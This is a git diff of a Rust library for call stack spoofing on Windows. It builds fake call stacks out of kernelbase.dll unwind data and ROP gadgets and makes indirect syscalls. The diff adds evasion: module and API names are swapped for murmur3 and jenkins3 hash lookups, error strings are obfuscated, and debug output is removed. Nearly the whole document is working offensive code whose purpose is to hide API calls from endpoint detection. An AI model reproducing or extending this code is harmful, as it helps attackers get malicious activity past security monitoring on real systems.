@@ -1,19 +1,15 @@
-use anyhow::{anyhow, Result};
-use alloc::vec::Vec;
-use obfstr::obfstr as s;
-use obfstr::obfbytes as b;
+use obfstr::{obfbytes as b, obfstring as s};
+use alloc::{vec::Vec, string::String};
+use alloc::borrow::Cow;
 use core::{ffi::c_void, slice::from_raw_parts};
-
-use crate::error::SpoofError::*;
-use crate::utils::shuffle;
 use dinvk::{
     GetModuleHandle, GetProcAddress, 
-    __readgsqword
-};
-use dinvk::{
+    __readgsqword, data::TEB,
     parse::get_nt_header, 
-    data::TEB
+    hash::{jenkins3, murmur3}, 
 };
+
+use crate::utils::shuffle;
 use crate::data::{
     Registers, IMAGE_DIRECTORY_ENTRY_EXCEPTION, 
     IMAGE_RUNTIME_FUNCTION, UNWIND_CODE, Config,
@@ -21,7 +17,7 @@ use crate::data::{
     UNW_FLAG_CHAININFO, UNW_FLAG_EHANDLER
 };
 
-extern "C" {
+unsafe extern "C" {
     /// Function responsible for Call Stack Spoofing (Desync)
     fn Spoof(config: &mut Config) -> *mut c_void;
 
@@ -29,15 +25,8 @@ extern "C" {
     fn SpoofSynthetic(config: &mut Config) -> *mut c_void;
 }
 
-/// Specifies the type of spoof being performed: either a normal function call
-/// or a native syscall resolved by name.
-pub enum SpoofKind {
-    /// Spoofs a call to a regular function pointer (e.g. a Windows API)
-    Function,
-    
-    /// Spoofs a native system call using its name (e.g. `"NtAllocateVirtualMemory"`).
-    Syscall(&'static str)
-}
+/// Type of error
+type Result<T> = core::result::Result<T, Cow<'static, str>>;
 
 /// Invokes the [`Uwd::spoof`] function with the target function address, using a desynchronized call stack.
 /// 
@@ -48,13 +37,17 @@ pub enum SpoofKind {
 #[macro_export]
 macro_rules! spoof {
     ($addr:expr, $($arg:expr),+ $(,)?) => {
-        $crate::Uwd::spoof(
-            $addr,
-            unsafe {
-                &[$(::core::mem::transmute($arg as usize)),*]
-            },
-            $crate::SpoofKind::Function
-        )
+        unsafe {
+            $crate::Uwd::spoof(
+                $addr,
+                vec![
+                    $(
+                        ::core::mem::transmute($arg as usize)
+                    ),*
+                ],
+                $crate::SpoofKind::Function
+            )
+        }
     };
 }
 
@@ -67,13 +60,17 @@ macro_rules! spoof {
 #[macro_export]
 macro_rules! syscall {
     ($name:literal, $($arg:expr),* $(,)?) => {
-        $crate::Uwd::spoof(
-            null_mut(),
-            unsafe {
-                &[$(::core::mem::transmute($arg as usize)),*]
-            },
-            $crate::SpoofKind::Syscall($name)
-        )
+        unsafe {
+            $crate::Uwd::spoof(
+                null_mut(),
+                vec![
+                    $(
+                        ::core::mem::transmute($arg as usize)
+                    ),*
+                ],
+                $crate::SpoofKind::Syscall($name)
+            )
+        }
     };
 }
 
@@ -86,13 +83,17 @@ macro_rules! syscall {
 #[macro_export]
 macro_rules! spoof_synthetic {
     ($addr:expr, $($arg:expr),+ $(,)?) => {
-        $crate::Uwd::spoof_synthetic(
-            $addr,
-            unsafe {
-                &[$(::core::mem::transmute($arg as usize)),*]
-            },
-            $crate::SpoofKind::Function
-        )
+        unsafe {
+            $crate::Uwd::spoof_synthetic(
+                $addr,
+                vec![
+                    $(
+                        ::core::mem::transmute($arg as usize)
+                    ),*
+                ],
+                $crate::SpoofKind::Function
+            )
+        }
     };
 }
 
@@ -105,35 +106,18 @@ macro_rules! spoof_synthetic {
 #[macro_export]
 macro_rules! syscall_synthetic {
     ($name:literal, $($arg:expr),* $(,)?) => {
-        $crate::Uwd::spoof_synthetic(
-            null_mut(),
-            unsafe {
-                &[$(::core::mem::transmute($arg as usize)),*]
-            },
-            $crate::SpoofKind::Syscall($name)
-        )
+        unsafe {
+            $crate::Uwd::spoof_synthetic(
+                null_mut(),
+                vec![
+                    $(
+                        ::core::mem::transmute($arg as usize)
+                    ),*
+                ],
+                $crate::SpoofKind::Syscall($name)
+            )
+        }
     };
-}
-
-/// Trait that allows casting any type to a raw pointer (`*const c_void` or `*mut c_void`).
-pub trait AsUwd {
-    /// Casts an immutable reference to a `*const c_void`.
-    fn as_uwd_const(&self) -> *const c_void;
-
-    /// Casts a mutable reference to a `*mut c_void`.
-    fn as_uwd_mut(&mut self) -> *mut c_void;
-}
-
-impl<T> AsUwd for T {
-    #[inline(always)]
-    fn as_uwd_const(&self) -> *const c_void {
-        self as *const _ as *const c_void
-    }
-
-    #[inline(always)]
-    fn as_uwd_mut(&mut self) -> *mut c_void {
-        self as *mut _ as *mut c_void
-    }
 }
 
 /// Represents metadata extracted from a function's prologue used for call stack spoofing.
@@ -156,11 +140,7 @@ struct Prolog {
 pub struct Uwd;
 
 impl Uwd {
-    /// Sets up and triggers call stack spoofing using a crafted stack layout and gadgets.
-    ///
-    /// This method reuses the current thread's stack by locating a return address that points to
-    /// `BaseThreadInitThunk`. From there, it builds a fake call stack using real prologues and ROP
-    /// gadgets, making the spoofed call appear legitimate to Windows' unwinder.
+    /// Performs call stack spoofing in `desync` mode, reusing the thread's real stack.
     ///
     /// # Arguments
     /// 
@@ -174,16 +154,16 @@ impl Uwd {
     /// 
     /// * `Ok(*mut c_void)` — On success, returns the result of the spoofed function or syscall.
     /// * `Err(SpoofError)` — If any required setup step fails (e.g., gadgets missing, invalid arguments).
-    pub fn spoof(addr: *mut c_void, args: &[*const c_void], kind: SpoofKind) -> Result<*mut c_void> {
+    pub fn spoof(addr: *mut c_void, args: Vec<*const c_void>, kind: SpoofKind) -> Result<*mut c_void> {
         // Max 11 arguments allowed
         if args.len() > 11 {
-            return Err(anyhow!(TooManyArguments));
+            return Err(s!("Too many arguments").into());
         }
 
         // Prevent calling a null function unless it's a syscall
         if let SpoofKind::Function = kind {
             if addr.is_null() {
-                return Err(anyhow!(NullFunctionAddress));
+                return Err(s!("Null function address").into());
             }
         }
 
@@ -191,35 +171,35 @@ impl Uwd {
         let mut config = Config::default();
 
         // Get the base address of kernelbase.dll
-        let kernelbase = GetModuleHandle(s!("kernelbase.dll"), None);
+        let kernelbase = GetModuleHandle(2737729883u32, Some(murmur3));
         
         // Extract the exception directory.
-        let (runtime_table, runtime_size) = get_exception_addr(kernelbase).ok_or(anyhow!(RuntimeAddressNotFound))?;
+        let (runtime_table, runtime_size) = get_exception_addr(kernelbase).ok_or(s!("Runtime Address Not Found"))?;
 
         // Locate a return address from BaseThreadInitThunk on the current stack.
-        config.return_address = Self::find_base_thread_return_address().ok_or(anyhow!(ReturnAddressNotFound))? as *const c_void;
+        config.return_address = Self::find_base_thread_return_address().ok_or(s!("Return address not found"))? as *const c_void;
 
         // Parse the IMAGE_RUNTIME_FUNCTION table into usable Rust slices.
         let tables = unsafe { from_raw_parts(runtime_table, runtime_size as usize / size_of::<IMAGE_RUNTIME_FUNCTION>()) };
         
         // First frame: a normal function with a clean prologue 
-        let first_prolog = Self::find_prolog(kernelbase, tables).ok_or(anyhow!(FirstPrologNotFound))?;
+        let first_prolog = Self::find_prolog(kernelbase, tables).ok_or(s!("First prolog not found"))?;
         config.first_frame_fp = (first_prolog.frame + first_prolog.offset as u64) as *const c_void;
         config.first_frame_size = first_prolog.stack_size as u64;
 
         // Second frame: looks specifically for a prologue with `push rbp`.
-        let second_prolog = Self::find_push_rbp(kernelbase, tables).ok_or(anyhow!(SecondPrologNotFound))?;
+        let second_prolog = Self::find_push_rbp(kernelbase, tables).ok_or(s!("Second prolog not found"))?;
         config.second_frame_fp = (second_prolog.frame + second_prolog.offset as u64) as *const c_void;
         config.second_frame_size = second_prolog.stack_size as u64;
         config.rbp_stack_offset = second_prolog.rbp_offset as u64;
 
         // Find a gadget `add rsp, 0x58; ret`.
-        let (add_rsp_addr, size) = Self::find_gadget(kernelbase, b!(&[0x48, 0x83, 0xC4, 0x58, 0xC3]), tables).ok_or(anyhow!(AddRspGadgetNotFound))?;
+        let (add_rsp_addr, size) = Self::find_gadget(kernelbase, b!(&[0x48, 0x83, 0xC4, 0x58, 0xC3]), tables).ok_or(s!("Add RSP gadget not found"))?;
         config.add_rsp_gadget = add_rsp_addr as *const c_void;
         config.add_rsp_frame_size = size as u64;
 
         // Find a gadget that performs `jmp rbx` - to restore the original call.
-        let (jmp_rbx_addr, size) = Self::find_gadget(kernelbase, b!(&[0xFF, 0x23]), tables).ok_or(anyhow!(JmpRbxGadgetNotFound))?;
+        let (jmp_rbx_addr, size) = Self::find_gadget(kernelbase, b!(&[0xFF, 0x23]), tables).ok_or(s!("JMP RBX gadget not found"))?;
         config.jmp_rbx_gadget = jmp_rbx_addr as *const c_void;
         config.jmp_rbx_frame_size = size as u64;
 
@@ -248,21 +228,21 @@ impl Uwd {
             // Executes a syscall indirectly
             SpoofKind::Syscall(name) => {
                 // Retrieves the ntdll address
-                let ntdll = dinvk::get_ntdll_address();
+                let ntdll = GetModuleHandle(2788516083u32, Some(murmur3));
                 if ntdll.is_null() {
-                    return Err(anyhow!(NtdllNotFound));
+                    return Err(s!("ntdll.dll not found").into());
                 }
 
                 // Retrieves the address of the function
                 let addr = GetProcAddress(ntdll, name, None);
                 if addr.is_null() {
-                    return Err(anyhow!(ProcAddressNotFound));
+                    return Err(s!("GetProcAddress returned null").into());
                 }
 
                 // Configures the parameters to be sent to execute the syscall indirectly
                 config.is_syscall = true as u32;
-                config.ssn = dinvk::ssn(name, ntdll).ok_or(anyhow!(SsnNotFound))?;
-                config.spoof_function = dinvk::get_syscall_address(addr).ok_or(anyhow!(SyscallAddressNotFound))? as *const c_void;
+                config.ssn = dinvk::ssn(name, ntdll).ok_or(s!("SSN not found"))?;
+                config.spoof_function = dinvk::get_syscall_address(addr).ok_or(s!("Syscall address not found"))? as *const c_void;
             }
         }
 
@@ -271,11 +251,7 @@ impl Uwd {
         Ok(result)
     }
 
-    /// Performs a synthetic version of call stack spoofing by simulating a startup stack layout.
-    ///
-    /// Unlike [`spoof`], this method uses hardcoded stack frames for `BaseThreadInitThunk` and
-    /// `RtlUserThreadStart` to simulate a legitimate call stack layout without searching the
-    /// current thread's real stack.
+    /// Performs call stack spoofing in `synthetic` mode, simulating a fake stack from scratch.
     /// 
     /// # Arguments
     ///
@@ -289,16 +265,16 @@ impl Uwd {
     ///
     /// * `Ok(*mut c_void)` — On success, returns the result of the spoofed function or syscall.
     /// * `Err(SpoofError)` — If any required setup step fails (e.g., gadgets missing, invalid arguments).
-    pub fn spoof_synthetic(addr: *mut c_void, args: &[*const c_void], kind: SpoofKind) -> Result<*mut c_void> {
+    pub fn spoof_synthetic(addr: *mut c_void, args: Vec<*const c_void>, kind: SpoofKind) -> Result<*mut c_void> {
         // Max 11 arguments allowed
         if args.len() > 11 {
-            return Err(anyhow!(TooManyArguments));
+            return Err(s!("Too many arguments").into());
         }
 
         // Prevent calling a null function unless it's a syscall
         if let SpoofKind::Function = kind {
             if addr.is_null() {
-                return Err(anyhow!(NullFunctionAddress));
+                return Err(s!("Null function address").into());
             }
         }
 
@@ -306,57 +282,57 @@ impl Uwd {
         let mut config = Config::default();
 
         // Get the base address of kernelbase.dll
-        let kernelbase = GetModuleHandle(s!("kernelbase.dll"), None);
+        let kernelbase = GetModuleHandle(2737729883u32, Some(murmur3));
 
         // Extract the exception directory.
-        let (runtime_table, runtime_size) = get_exception_addr(kernelbase).ok_or(anyhow!(RuntimeAddressNotFound))?;
+        let (runtime_table, runtime_size) = get_exception_addr(kernelbase).ok_or(s!("Runtime Address Not Found"))?;
 
         // Parse the IMAGE_RUNTIME_FUNCTION table into usable Rust slices.
         let tables = unsafe { from_raw_parts(runtime_table, runtime_size as usize / size_of::<IMAGE_RUNTIME_FUNCTION>()) };
 
         // Preparing addresses to use as artificial frames to emulate thread stack initialization
-        let ntdll = dinvk::get_ntdll_address();
+        let ntdll = GetModuleHandle(2788516083u32, Some(murmur3));
         if ntdll.is_null() {
-            return Err(anyhow!(NtdllNotFound));
+            return Err(s!("ntdll.dll not found").into());
         }
         
-        let kernel32 = GetModuleHandle(s!("kernel32.dll"), None);
-        let rlt_user_addr = GetProcAddress(ntdll, s!("RtlUserThreadStart"), None);
-        let base_thread_addr = GetProcAddress(kernel32, s!("BaseThreadInitThunk"), None);
+        let kernel32 = GetModuleHandle(2808682670u32, Some(murmur3));
+        let rlt_user_addr = GetProcAddress(ntdll, 3761471966u32, Some(jenkins3));
+        let base_thread_addr = GetProcAddress(kernel32, 4073232152u32, Some(jenkins3));
         config.rtl_user_addr = rlt_user_addr;
         config.base_thread_addr = base_thread_addr;
 
         // Recovering the IMAGE_RUNTIME_FUNCTION structure of target apis
         let rtl_user_runtime = find_runtime_function(ntdll, (rlt_user_addr as usize - ntdll as usize) as u32)
-            .ok_or(anyhow!(RtlUserRuntimeNotFound))?;
+            .ok_or(s!("RtlUserThreadStart unwind info not found"))?;
         
         let base_thread_runtime = find_runtime_function(kernel32, (base_thread_addr as usize - kernel32 as usize) as u32)
-            .ok_or(anyhow!(BaseThreadRuntimeNotFound))?;
+            .ok_or(s!("BaseThreadInitThunk unwind info not found"))?;
 
         // Recovering the stack size of target apis
-        let rtl_user_size = StackFrame::ignoring_set_fpreg(ntdll, rtl_user_runtime).ok_or(anyhow!(RtlUserStackSizeNotFound))?;
-        let base_thread_size = StackFrame::ignoring_set_fpreg(kernel32, base_thread_runtime).ok_or(anyhow!(BaseThreadStackSizeNotFound))?;
+        let rtl_user_size = StackFrame::ignoring_set_fpreg(ntdll, rtl_user_runtime).ok_or(s!("RtlUserThreadStart stack size not found"))?;
+        let base_thread_size = StackFrame::ignoring_set_fpreg(kernel32, base_thread_runtime).ok_or(s!("BaseThreadInitThunk stack size not found"))?;
         config.rtl_user_thread_size = rtl_user_size as u64;
         config.base_thread_size = base_thread_size as u64;
 
         // First frame: a normal function with a clean prologue 
-        let first_prolog = Self::find_prolog(kernelbase, tables).ok_or(anyhow!(FirstPrologNotFound))?;
+        let first_prolog = Self::find_prolog(kernelbase, tables).ok_or(s!("First prolog not found"))?;
         config.first_frame_fp = (first_prolog.frame + first_prolog.offset as u64) as *const c_void;
         config.first_frame_size = first_prolog.stack_size as u64;
 
         // Second frame: looks specifically for a prologue with `push rbp`.
-        let second_prolog = Self::find_push_rbp(kernelbase, tables).ok_or(anyhow!(SecondPrologNotFound))?;
+        let second_prolog = Self::find_push_rbp(kernelbase, tables).ok_or(s!("Second prolog not found"))?;
         config.second_frame_fp = (second_prolog.frame + second_prolog.offset as u64) as *const c_void;
         config.second_frame_size = second_prolog.stack_size as u64;
         config.rbp_stack_offset = second_prolog.rbp_offset as u64;
 
         // Find a gadget `add rsp, 0x58; ret`.
-        let (add_rsp_addr, size) = Self::find_gadget(kernelbase, b!(&[0x48, 0x83, 0xC4, 0x58, 0xC3]), tables).ok_or(anyhow!(AddRspGadgetNotFound))?;
+        let (add_rsp_addr, size) = Self::find_gadget(kernelbase, b!(&[0x48, 0x83, 0xC4, 0x58, 0xC3]), tables).ok_or(s!("Add RSP gadget not found"))?;
         config.add_rsp_gadget = add_rsp_addr as *const c_void;
         config.add_rsp_frame_size = size as u64;
 
         // Find a gadget that performs `jmp rbx` - to restore the original call.
-        let (jmp_rbx_addr, size) = Self::find_gadget(kernelbase, b!(&[0xFF, 0x23]), tables).ok_or(anyhow!(JmpRbxGadgetNotFound))?;
+        let (jmp_rbx_addr, size) = Self::find_gadget(kernelbase, b!(&[0xFF, 0x23]), tables).ok_or(s!("JMP RBX gadget not found"))?;
         config.jmp_rbx_gadget = jmp_rbx_addr as *const c_void;
         config.jmp_rbx_frame_size = size as u64;
 
@@ -387,13 +363,13 @@ impl Uwd {
                 // Retrieves the address of the function
                 let addr = GetProcAddress(ntdll, name, None);
                 if addr.is_null() {
-                    return Err(anyhow!(ProcAddressNotFound));
+                    return Err(s!("GetProcAddress returned null").into());
                 }
 
                 // Configures the parameters to be sent to execute the syscall indirectly
                 config.is_syscall = true as u32;
-                config.ssn = dinvk::ssn(name, ntdll).ok_or(anyhow!(SsnNotFound))?;
-                config.spoof_function = dinvk::get_syscall_address(addr).ok_or(anyhow!(SyscallAddressNotFound))? as *const c_void;
+                config.ssn = dinvk::ssn(name, ntdll).ok_or(s!("SSN not found"))?;
+                config.spoof_function = dinvk::get_syscall_address(addr).ok_or(s!("Syscall address not found"))? as *const c_void;
             }
         }
 
@@ -494,13 +470,13 @@ impl Uwd {
     fn find_base_thread_return_address() -> Option<usize> {
         unsafe {
             // Get handle for kernel32.dll
-            let kernel32 = GetModuleHandle(s!("kernel32.dll"), None);
+            let kernel32 = GetModuleHandle(2808682670u32, Some(murmur3));
             if kernel32.is_null() {
                 return None;
             }
     
             // Resolves the address of the BaseThreadInitThunk function
-            let base_thread = GetProcAddress(kernel32, s!("BaseThreadInitThunk"), None);
+            let base_thread = GetProcAddress(kernel32, 4073232152u32, Some(jenkins3));
             if base_thread.is_null() {
                 return None;
             }
@@ -667,8 +643,6 @@ impl StackFrame {
                     // Saves a non-volatile register on the stack.
                     //
                     // Example: push <reg>
-                    //
-                    // println!("[0x{:?}] - UWOP_PUSH_NONVOL ({:?}, {:x?})", unwind_op, registers[op_info as usize], code_offset);
                     Ok(UWOP_PUSH_NONVOL) => {
                         if Registers::RSP == op_info {
                             return None;
@@ -693,8 +667,6 @@ impl StackFrame {
                     //
                     // Example (OpInfo == 0): sub rsp, 0x100 ; Allocates 256 bytes
                     // Example (OpInfo == 1): sub rsp, 0x10000 ; Allocates 65536 bytes (two slots used)
-                    //
-                    // println!("[0x{:x?}] - UWOP_ALLOC_LARGE (Size: {:x?})", unwind_op, frame_offset);
                     Ok(UWOP_ALLOC_LARGE) => {
                         if (*unwind_code).Anonymous.OpInfo() == 0 {
                             // Case 1: OpInfo == 0 (Size in 1 slot, divided by 8)
@@ -718,8 +690,6 @@ impl StackFrame {
                     // Allocates small space in the stack.
                     //
                     // Example (OpInfo = 3): sub rsp, 0x20  ; Aloca 32 bytes (OpInfo + 1) * 8
-                    //
-                    // println!("[0x{:x?}] - UWOP_ALLOC_SMALL (0x{:x?})", unwind_op, (op_info + 1) * 8);
                     Ok(UWOP_ALLOC_SMALL) => {
                         total_stack += ((op_info + 1) * 8) as u32;
                         i += 1;
@@ -730,8 +700,6 @@ impl StackFrame {
                     // - FrameOffset: Offset indicating where the value of the register is saved.
                     //
                     // Example: mov [rsp + 0x40], rsi ; Saves the contents of RSI in RSP + 0x40
-                    // 
-                    // println!("[0x{:x?}] - UWOP_SAVE_NONVOL ({:?}, Offset: {:x?})", unwind_op, registers[op_info as usize], frame_offset * 8);
                     Ok(UWOP_SAVE_NONVOL) => {
                         if Registers::RSP == op_info {
                             return None;
@@ -755,8 +723,6 @@ impl StackFrame {
                     // - FrameOffset: Long offset indicating where the value of the register is saved.
                     //
                     // Example: mov [rsp + 0x1040], rsi ; Saves the contents of RSI in RSP + 0x1040.
-                    //
-                    // println!("[0x{:x?}] - UWOP_SAVE_NONVOL_BIG ({:?}, Offset: {:x?})", unwind_op, registers[unwind_op as usize], frame_offset);
                     Ok(UWOP_SAVE_NONVOL_BIG) => {
                         if Registers::RSP == op_info {
                             return None;
@@ -780,8 +746,6 @@ impl StackFrame {
 
                     // - Reg: Name of the saved XMM register.
                     // - FrameOffset: Offset indicating where the value of the register is saved.
-                    //
-                    // Example: movaps [rsp + 0x20], xmm6 ; Saves the contents of XMM6 in RSP + 0x20.
                     Ok(UWOP_SAVE_XMM128) => i += 2,
     
                     // UWOP_SAVE_XMM128BIG: Saves the contents of a non-volatile XMM register to a stack address with a long offset.
@@ -854,8 +818,6 @@ impl StackFrame {
                     // Saves a non-volatile register on the stack.
                     //
                     // Example: push <reg>
-                    //
-                    // println!("[0x{:?}] - UWOP_PUSH_NONVOL ({:?}, {:x?})", unwind_op, registers[op_info as usize], code_offset);
                     Ok(UWOP_PUSH_NONVOL) => {
                         if Registers::RSP == op_info && !set_fpreg_hit {
                             return None;
@@ -868,8 +830,6 @@ impl StackFrame {
                     // Allocates small space in the stack.
                     //
                     // Example (OpInfo = 3): sub rsp, 0x20  ; Aloca 32 bytes (OpInfo + 1) * 8
-                    //
-                    // println!("[0x{:x?}] - UWOP_ALLOC_SMALL (0x{:x?})", unwind_op, (op_info + 1) * 8);
                     Ok(UWOP_ALLOC_SMALL) => {
                         total_stack += ((op_info + 1) * 8) as i32;
                         i += 1;
@@ -881,8 +841,6 @@ impl StackFrame {
                     //
                     // Example (OpInfo == 0): sub rsp, 0x100 ; Allocates 256 bytes
                     // Example (OpInfo == 1): sub rsp, 0x10000 ; Allocates 65536 bytes (two slots used)
-                    //
-                    // println!("[0x{:x?}] - UWOP_ALLOC_LARGE (Size: {:x?})", unwind_op, frame_offset);
                     Ok(UWOP_ALLOC_LARGE) => {
                         if (*unwind_code).Anonymous.OpInfo() == 0 {
                             // Case 1: OpInfo == 0 (Size in 1 slot, divided by 8)
@@ -908,8 +866,6 @@ impl StackFrame {
                     // - FrameOffset: Offset indicating where the value of the register is saved.
                     //
                     // Example: mov [rsp + 0x40], rsi ; Saves the contents of RSI in RSP + 0x40
-                    // 
-                    // println!("[0x{:x?}] - UWOP_SAVE_NONVOL ({:?}, Offset: {:x?})", unwind_op, registers[op_info as usize], frame_offset * 8);
                     Ok(UWOP_SAVE_NONVOL) => {
                         if Registers::RSP == op_info || Registers::RBP == op_info {
                             return None;
@@ -923,8 +879,6 @@ impl StackFrame {
                     // - FrameOffset: Long offset indicating where the value of the register is saved.
                     //
                     // Example: mov [rsp + 0x1040], rsi ; Saves the contents of RSI in RSP + 0x1040.
-                    //
-                    // println!("[0x{:x?}] - UWOP_SAVE_NONVOL_BIG ({:?}, Offset: {:x?})", unwind_op, registers[unwind_op as usize], frame_offset);
                     Ok(UWOP_SAVE_NONVOL_BIG) => {
                         if Registers::RSP == op_info || Registers::RBP == op_info {
                             return None;
@@ -1028,8 +982,6 @@ impl StackFrame {
                     // Saves a non-volatile register on the stack.
                     //
                     // Example: push <reg>
-                    //
-                    // println!("[0x{:?}] - UWOP_PUSH_NONVOL ({:?}, {:x?})", unwind_op, registers[op_info as usize], code_offset);
                     Ok(UWOP_PUSH_NONVOL) => {
                         if Registers::RSP == op_info {
                             return None;
@@ -1042,8 +994,6 @@ impl StackFrame {
                     // Allocates small space in the stack.
                     //
                     // Example (OpInfo = 3): sub rsp, 0x20  ; Aloca 32 bytes (OpInfo + 1) * 8
-                    //
-                    // println!("[0x{:x?}] - UWOP_ALLOC_SMALL (0x{:x?})", unwind_op, (op_info + 1) * 8);
                     Ok(UWOP_ALLOC_SMALL) => {
                         total_stack += ((op_info + 1) * 8) as u32;
                         i += 1;
@@ -1055,8 +1005,6 @@ impl StackFrame {
                     //
                     // Example (OpInfo == 0): sub rsp, 0x100 ; Allocates 256 bytes
                     // Example (OpInfo == 1): sub rsp, 0x10000 ; Allocates 65536 bytes (two slots used)
-                    //
-                    // println!("[0x{:x?}] - UWOP_ALLOC_LARGE (Size: {:x?})", unwind_op, frame_offset);
                     Ok(UWOP_ALLOC_LARGE) => {
                         if (*unwind_code).Anonymous.OpInfo() == 0 {
                             // Case 1: OpInfo == 0 (Size in 1 slot, divided by 8)
@@ -1082,8 +1030,6 @@ impl StackFrame {
                     // - FrameOffset: Offset indicating where the value of the register is saved.
                     //
                     // Example: mov [rsp + 0x40], rsi ; Saves the contents of RSI in RSP + 0x40
-                    // 
-                    // println!("[0x{:x?}] - UWOP_SAVE_NONVOL ({:?}, Offset: {:x?})", unwind_op, registers[op_info as usize], frame_offset * 8);
                     Ok(UWOP_SAVE_NONVOL) => {
                         if Registers::RSP == op_info {
                             return None;
@@ -1097,8 +1043,6 @@ impl StackFrame {
                     // - FrameOffset: Long offset indicating where the value of the register is saved.
                     //
                     // Example: mov [rsp + 0x1040], rsi ; Saves the contents of RSI in RSP + 0x1040.
-                    //
-                    // println!("[0x{:x?}] - UWOP_SAVE_NONVOL_BIG ({:?}, Offset: {:x?})", unwind_op, registers[unwind_op as usize], frame_offset);
                     Ok(UWOP_SAVE_NONVOL_BIG) => {
                         if Registers::RSP == op_info {
                             return None;
@@ -1212,4 +1156,34 @@ fn find_runtime_function(module: *mut c_void, offset: u32) -> Option<&'static IM
     }
 
     None
+}
+
+/// Trait that allows casting any type to a raw pointer (`*const c_void` or `*mut c_void`).
+pub trait AsUwd {
+    /// Casts an immutable reference to a `*const c_void`.
+    fn as_uwd_const(&self) -> *const c_void;
+
+    /// Casts a mutable reference to a `*mut c_void`.
+    fn as_uwd_mut(&mut self) -> *mut c_void;
+}
+
+impl<T> AsUwd for T {
+    #[inline(always)]
+    fn as_uwd_const(&self) -> *const c_void {
+        self as *const _ as *const c_void
+    }
+
+    #[inline(always)]
+    fn as_uwd_mut(&mut self) -> *mut c_void {
+        self as *mut _ as *mut c_void
+    }
+}
+
+/// Specifies the type of spoof being performed
+pub enum SpoofKind {
+    /// Spoofs a call to a regular function pointer (e.g. a Windows API)
+    Function,
+    
+    /// Spoofs a native system call using its name (e.g. `"NtAllocateVirtualMemory"`).
+    Syscall(&'static str)
 }
